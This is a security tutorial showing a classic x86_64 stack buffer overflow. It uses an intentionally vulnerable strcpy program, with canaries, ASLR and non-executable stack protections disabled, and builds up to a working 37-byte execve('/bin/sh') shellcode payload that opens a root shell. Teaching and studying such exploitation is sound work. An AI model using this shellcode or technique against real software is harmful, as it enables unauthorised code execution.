# Buffer Overflow

## Table of Contents
1. [Overwriting the  Return Address](#section1)
2. [The execve() Command](#section2)
2. [Shell Code](#section3)

C language programs: &nbsp;[C1](#c1)  &nbsp;[C2](#c2)  &nbsp;[C3](#c3)

## Overwriting the Return Address <a name="section1"></a>

**C 1**: <a name="c1"></a> The C program [overflow.c](overflow.c) consists of a main program `main()` that calls the function `copy()` which copies the command line argument string `argv[1]` into an interal string buffer with a limited size of 8 bytes residing on the  *Stack*:
```C
 1 #include <string.h>
 2 #include <stdio.h>
 3 #include <stdlib.h>
 4 #include <stdint.h>
 5 #include <inttypes.h>
 6
 7 char* copy(char *b)
 8 {
 9     char  buf[8];
10
11     strcpy(buf, b);
12
13     printf("&buf 0x%016" PRIx64 " rbp 0x%016" PRIx64 " rip 0x%016" PRIx64 "\n",
14           (intptr_t*)buf, *(intptr_t*)(buf + 8), *(intptr_t*)(buf + 16));
15 }
16
17 int main(int argc, char** argv)
18 {
19     char *b;
20
21    if (argc < 2)
22    {
23        exit(1);
24    }
25    copy(argv[1]);
26    printf("We happily returned!\n");
27    exit(0);
28 }
```
We compile the program with the use of frame pointers but with **disabled canaries** so that we are able to overwrite the saved return address
```console
> gcc -ggdb -fno-stack-protector -o overflow overflow.c
```
Additionally we disable the *Address Space Layout Randomization* (ASLR)
```
> sudo -s
> echo 0 > /proc/sys/kernel/randomize_va_space
```
First we call `overflow` with an input string just completely filling the buffer `buf[8]` but leaving the saved *base pointer*  `%rbp` located just above the buffer still intact.
```console
> ./overflow "1234567"
&buf 0x00007fffffffe508 rbp 0x00007fffffffe530 rip 0x00005555555551e7
We happily returned!
```
Next we completely overwrite the saved *base pointer* `%rbp` with the numbers  `1` to `7` and the terminating `nul`character.
```console
> ./overflow "123456781234567"
&buf 0x00007fffffffe508 rbp 0x0037363534333231 rip 0x00005555555551e7
We happily returned!
```
In a final step we want to overwrite the saved *instruction pointer* `%rip` with the start address of the buffer `buf` which currently has the value`0x7fffffffe508` as the output above shows . Please take into account that the memory address has to be encoded in little-endian format, i.e.  as the byte string `\x08\xe5\xff\xff\xff\x7f`. 

Additionally we replace the first 8 bytes of the string with `nop` machine instructions that are represented by the binary code `0x90`.
```console
> export STR=`echo -e -n "\x90\x90\x90\x90\x90\x90\x90\x9012345678\x08\xe5\xff\xff\xff\x7f"`
```
We used the `echo -e` command to generate the input string containing escape characters and store the byte string in the environment variable `$STR`. The `-n` option suppressed the terminating  newline character in the `echo`output.

Now we execute `overflow`with the content of the environment variable as input
```console
> ./overflow $STR
&buf 0x00007fffffffe4e8 rbp 0x3837363534333231 rip 0x00007fffffffe508
Segmentation fault
```
We notice that due to the new environment variable `$STR` and the increased `argv[1]` input argument  the local stack of the calling shell has grown downward by 32 bytes and correspondingly the start address of `buf` on the local stack of the `copy` function has shifted to `0x7fffffffe4e8`. Therefore we adapt the input string accordingly:
```console
> export STR=`echo -n -e "\x90\x90\x90\x90\x90\x90\x90\x9012345678\xe8\xe4\xff\xff\xff\x7f"`
```
Now the return address saved on the stack is overwritten with the start address of `buf` and a *Segmentation fault* occurs.
```console
> ./overflow $STR
&buf 0x00007fffffffe4e8 rbp 0x3837363534333231 rip 0x00007fffffffe4e8
Segmentation fault
```
In order to analyze what just happened we run `overflow`in the debugger
```assembly
> gdb -n overflow
(gdb) run $STR
Starting program: /home/hacker/overflow $STR
&buf 0x00007fffffffe4a8 rbp 0x3837363534333231 rip 0x00007fffffffe4e8
Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffe4e8 in ?? ()
```
We see that the *Segmentation fault* occurred at instruction address `0x7fffffffe4e8` so the jump to the stack seems to have been successful, but due to the debugger environment the start address of `buf` has shifted again to `0x7fffffffe4a8` so we have to adapt the return address in `$STR` accordingly
```console
export STR=`echo -e -n "\x90\x90\x90\x90\x90\x90\x90\x9012345678\xa8\xe4\xff\xff\xff\x7f"`
```
We start the debugger agin and set a breakpoint at line `15`
```assembly
> gdb -n overflow
(gdb) break 15
Breakpoint 1 at 0x11b2: file overflow.c, line 15.
```
Then we run the program in the debugger up to line `15`
```assembly
(gdb) run $STR
Starting program: /home/hacker/overflow $STR
&buf 0x00007fffffffe4a8 rbp 0x3837363534333231 rip 0x00007fffffffe4a8

Breakpoint 1, copy (
    b=0x7fffffffe80e "\220\220\220\220\220\220\220\220\061\062\063\064\065\066\067\070\250\344\377\377\377\177") at overflow.c:15
15	}
```
Let's disassemble the `copy` function
```assembly
(gdb) disassemble copy
Dump of assembler code for function copy:
   0x0000555555555165 <+0>:  push   %rbp
   0x0000555555555166 <+1>:  mov    %rsp,%rbp
   0x0000555555555169 <+4>:  sub    $0x20,%rsp
   0x000055555555516d <+8>:  mov    %rdi,-0x18(%rbp)
   0x0000555555555171 <+12>: mov    -0x18(%rbp),%rdx
   0x0000555555555175 <+16>: lea    -0x8(%rbp),%rax
   0x0000555555555179 <+20>: mov    %rdx,%rsi
   0x000055555555517c <+23>: mov    %rax,%rdi
   0x000055555555517f <+26>: callq  0x555555555030 <strcpy@plt>
   0x0000555555555184 <+31>: lea    -0x8(%rbp),%rax
   0x0000555555555188 <+35>: add    $0x10,%rax
   0x000055555555518c <+39>: mov    (%rax),%rcx
   0x000055555555518f <+42>: lea    -0x8(%rbp),%rax
   0x0000555555555193 <+46>: add    $0x8,%rax
   0x0000555555555197 <+50>: mov    (%rax),%rdx
   0x000055555555519a <+53>: lea    -0x8(%rbp),%rax
   0x000055555555519e <+57>: mov    %rax,%rsi
   0x00005555555551a1 <+60>: lea    0xe60(%rip),%rdi        # 0x555555556008
   0x00005555555551a8 <+67>: mov    $0x0,%eax
   0x00005555555551ad <+72>: callq  0x555555555050 <printf@plt>
=> 0x00005555555551b2 <+77>: nop
   0x00005555555551b3 <+78>: leaveq 
   0x00005555555551b4 <+79>: retq   
End of assembler dump.
```
Now we step through the machine instructions step by step until we execute the `retq` command
```assembly
(gdb) stepi
0x00005555555551b3	15	}
(gdb) x/i $rip
=> 0x5555555551b3 <copy+78>:	leaveq 
(gdb) stepi
0x00005555555551b4	15	}
(gdb) x/i $rip
=> 0x5555555551b4 <copy+79>:	retq   
(gdb) stepi
0x00007fffffffe4a8 in ?? ()
(gdb) x/i $rip
=> 0x7fffffffe4a8:	nop
```
The `retq`operation retrieves the saved `%rip`from the stack and jumps to the start address `0x7fffffffe4a8`of the `buf` variable on the *Stack*. The next machine instruction to be executed will be the `nop` operation encoded into the input string.

But when we try to execute the `nop` instruction on the *Stack* the program crashes with a *Segmentation fault*, the reason being that by default execution on the *Stack* is not allowed.
```assembly
(gdb) stepi
Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffe4a8 in ?? ()
```
We can explicitly allow execution on the *Stack* with the `-Wa,--exec` compiler option
```console
gcc -ggdb -fno-stack-protector -Wa,--exec -o overflow overflow.c
```
When we now run `overflow`in the debugger the *Segmentation fault* occurs at `0x7fffffffe4b0` where the first invalid instruction  is encountered after the execution of the eight `nop` instructions on the *Stack*.
```assembly
> gdb -n overflow
(gdb) run $STR
Starting program: /home/hacker/overflow $STR
&buf 0x00007fffffffe4a8 rbp 0x3837363534333231 rip 0x00007fffffffe4a8

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffe4b0 in ?? ()
```
## The execve() Command <a name="section2"></a>

The `execve()` system call hands the current process together with its process ID and all access rights to the program called by `execve()` .

**C 2**: <a name="c2"></a> The C program [execve.c](execve.c) shown below hands over control of the current process to `/bin/sh`.
```C
 1 #include <stdio.h>
 2 #include <stdlib.h>
 3 #include <unistd.h>
 4
 5 int main(void)
 6 {
 7     char string[] = "/bin/sh";
 8     char *argv[2];
 9
10     argv[0] = string;
11     argv[1] = NULL;
12     execve(string, argv, NULL);
13     exit(0);
14 }
```
We compile `execve.c`with the command
```console
> gcc -o execve execve.c
```
and run `execve`
```console
> ./execve
#
```
We see that the process running the program has been taken over be a shell.
```console
# env
PWD=/home/hacker
# id
uid=0(root) gid=0(root) groups=0(root)
# exit
>
```

## Shell Code <a name="section3"></a>

The x86_64 binary shell code to execute `/bin/shell`via an `execve()` system call consists of the following 37 bytes 
```C
char shellcode[] =
   "\xeb\x17\x5f\x48\x31\xd2\x88\x57\x07\x48\x89\x7f\x08\x48\x89\x57" 
   "\x10\x48\x8d\x77\x08\xb0\x3b\x0f\x05\xe8\xe4\xff\xff\xff/bin/sh";
```

**C 3**: <a name="c3"></a> The C program [exploit.c](exploit.c) differs from [overflow.c](overflow.c) just in the size of the buffer `buf` which has been increased to 48 bytes in order to accomodate the shell code listed above:
```C
 1 #include <string.h>
 2 #include <stdio.h>
 3 #include <stdlib.h>
 4 #include <stdint.h>
 5 #include <inttypes.h>
 6
 7 char* copy(char *b)
 8 {
 9     char  buf[48];
10
11     strcpy(buf, b);
12
13     printf("&buf 0x%016" PRIx64 " rbp 0x%016" PRIx64 " rip 0x%016" PRIx64 "\n",
14           (intptr_t*)buf, *(intptr_t*)(buf + 48), *(intptr_t*)(buf + 56));
15 }
16
17 int main(int argc, char** argv)
18 {
19     char *b;
20
21    if (argc < 2)
22    {
23        exit(1);
24    }
25    copy(argv[1]);
26    printf("We happily returned!\n");
27    exit(0);
28 }
```
We compile `exploit.c`whith disabled canaries and enabled stack execution
```console
> gcc -ggdb -fno-stack-protector -Wa,--exec -o exploit exploit.c
```
When we execute `exploit` with an input argument exactly matching  the buffer size, the `copy` function happily returns to the main program.
```console
> ./exploit "12345678123456781234567812345678123456781234567"
&buf 0x00007fffffffe480 rbp 0x00007fffffffe4d0 rip 0x00005555555551e7
We happily returned!
```
Since the saved `%rip`is at an offset of 56 bytes from the start address of `buf` we append 19 `nop`operations to the 37 byte shell code before overwriting the return address with the start addresss `0x7fffffffe470` of the buffer.
```console
> export STR=`echo -e -n "\xeb\x17\x5f\x48\x31\xd2\x88\x57\x07\x48\x89\x7f\x08\x48\x89\x57\x10\x48\x8d\x77\x08\xb0\x3b\x0f\x05\xe8\xe4\xff\xff\xff/bin/sh\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x70\xe4\xff\xff\xff\x7f"`
```
When we execute `expoit`with the shell code, the `copy`function never returns to the main program but opens a shell instead.
```console
> ./exploit $STR
&buf 0x00007fffffffe470 rbp 0x9090909090909090 rip 0x00007fffffffe470
# 
```

Author:  [Andreas Steffen][AS] [CC BY 4.0][CC]

[AS]: mailto:andreas.steffen@strongsec.net
[CC]: http://creativecommons.org/licenses/by/4.0/

